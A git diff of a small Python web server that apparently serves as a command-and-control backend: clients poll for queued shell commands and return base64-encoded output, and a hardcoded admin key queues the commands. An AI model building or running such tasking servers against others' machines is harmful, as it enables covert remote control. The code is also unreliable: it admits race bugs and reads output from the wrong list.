@@ -19,9 +19,10 @@ valid_uuids = ['test-system',
 admin_uuids = ['cockandballs']
 
 # Commands are executed in reverse order - fix this.
-command_response_list = ['dir',
-                         'cd ..',
-                         'dir']
+command_list = ['one',
+                'two',
+                'three',
+                'four']
 
 response_list = ['']
 
@@ -38,19 +39,24 @@ def ping(uuid: str):
     return Response('Success')
 
 
+# command() and command_response() introduce the possibility for race-condition related UB, idc
+
 @app.get('/commands/<{uuid}>')
 def command(uuid: str):
-    if len(command_response_list) > 0:
-        return Response(command_response_list[len(command_response_list) - 1])
+    if len(command_list) > 0:
+        return Response(command_list[len(command_list) - 1])
     else:
         return Response('')
 
 
 @app.get('/command_response/<{uuid}>{response}')
 def command_response(response: str):
-    response = decode(response)
-    command_response_list.insert(0, response)
-    print(command_response_list[0])
+    if len(command_list) > 0:
+        command_list.remove(command_list[len(command_list) - 1])
+
+        response = decode(response)
+        response_list.insert(0, response)
+        print(response_list[0])
     return Response('')
 
 
@@ -61,7 +67,7 @@ def command_response(response: str):
 def admin_send_command(admin_uuid: str, requested_command: str):
     if admin_uuid in admin_uuids:
         requested_command = encode(requested_command)
-        command_response_list.insert(0, requested_command)
+        command_list.insert(0, requested_command)
         return Response('')
     else:
         return Response('Admin UUID Required')
@@ -70,7 +76,7 @@ def admin_send_command(admin_uuid: str, requested_command: str):
 @app.get('/admin/view_command_output/<{admin_uuid}>{response}')
 def admin_view_command_output(admin_uuid: str, response: str):
     if admin_uuid in admin_uuids:
-        command_output = encode(command_response_list[0])
+        command_output = encode(command_list[0])
         return Response(command_output)
     else:
         return Response('Admin UUID Required')
@@ -98,14 +104,22 @@ async def log_request(request: Request, call_next):
 # Misc functions start here
 
 def decode(string):
-    string = string.encode('ascii')
-    string = base64.b64decode(string)
-    string = string.decode('ascii')
-    return string
+    try:
+        string = string.encode('ascii')
+        string = base64.b64decode(string)
+        string = string.decode('ascii')
+        return string
+
+    except UnicodeDecodeError:
+        return ''
 
 
 def encode(string):
-    string = string.encode('ascii')
-    string = base64.b64encode(string)
-    string = string.decode('ascii')
-    return string
+    try:
+        string = string.encode('ascii')
+        string = base64.b64encode(string)
+        string = string.decode('ascii')
+        return string
+
+    except UnicodeDecodeError:
+        return ''
